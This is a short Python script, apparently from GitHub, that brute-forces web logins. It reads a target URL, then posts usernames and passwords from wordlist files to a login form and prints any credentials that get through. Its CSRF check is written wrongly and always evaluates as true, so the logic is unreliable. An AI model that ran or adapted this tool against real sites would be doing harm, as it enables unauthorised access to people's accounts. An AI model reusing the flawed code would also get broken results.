######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################

print (""" 
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Mohamed Adel
        https://github.com/programmermohamedadel
""")

z = """     
                       Checking the Server !!
        
        [+]█████████████████████████████████████████████████[+]
"""


import requests
import time
import sys

url = input("Enter Target Url: ")
#username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")


# Using readline()
username = open('username.txt', 'r')
count = 0
 
while True:
    count += 1
 
    # Get next line from file
    line = username.readline()
 
    # if line is empty
    # end of file is reached
    if not line:
        break
    print("username {}: {}".format(count, line.strip()))
    with open("passwords.txt", "r") as passwords:
        bruteCracking(line,url,error)
 
username.close()



    
    
    

    



print("[!!] password not in list")